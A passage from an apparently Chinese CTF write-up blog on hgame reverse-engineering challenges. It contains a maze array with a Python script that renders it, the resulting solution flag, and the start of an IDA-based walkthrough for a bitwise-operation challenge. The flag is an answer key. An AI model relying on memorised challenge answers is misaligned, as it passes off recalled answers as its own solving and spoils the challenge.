class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">maze =[</span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">usefulmaze=''</span><br><span class="line"><span class="symbol">for i in range(len(maze)):</span></span><br><span class="line"><span class="symbol">    if i%64==0:</span></span><br><span class="line">        usefulmaze+=<span class="string">"\n"</span></span><br><span class="line"><span class="symbol">    if i%4==0:</span></span><br><span class="line">        usefulmaze+=str(maze[i])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">print usefulmaze</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="https://i.loli.net/2020/04/30/p7XQ8zSv2gnRmkN.png" alt="img"></p><p>所以flag：hgame{ssssddddddsssssddwwdddssssdssdd}</p><h3 id="bitwise-operation"><a href="#bitwise-operation" class="headerlink" title="bitwise_operation"></a>bitwise_operation</h3><h4 id="题目介绍：-18"><a href="#题目介绍：-18" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p> 还记得第三次C语言培训的作业“位运算”吗？这是2.0<br>学习资料：<a href="http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png" target="_blank" rel="noopener">http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png</a> </p><h4 id="解题思路：-18"><a href="#解题思路：-18" class="headerlink" title="解题思路："></a>解题思路：</h4><p>也是一个静态分析的题</p><p>核心代码：</p><p><img src="https://i.loli.net/2020/04/30/CurdNw6vIlkLzQf.png" alt="img"></p><p>可以看到，v8，v11,v13，是负数，然后判断那边也有一些特定是数字，</p><p>其实通过前面的变量的定义</p><p>这些都是字符型，所以其实是可以用R键来转换的</p><p>如果有不可见字符，不方便看，那就用H键变成int型，</p><p>这些键位的意思，右键就可以看到了</p><p>转变之后就变成了这样</p><p><img src="https://i.loli.net/2020/04/30/yIFgl2DxJrOGWnR.png" alt="img"></p><p>这样会方便的多</p><p>我们先看到其中得函数sub_400616（）</p><p>读下来其实不难明白，其实就是实现了一个atoll的功能，</p><p>就是将字符串每两位取下来，作为一个整型，举个栗子，就是 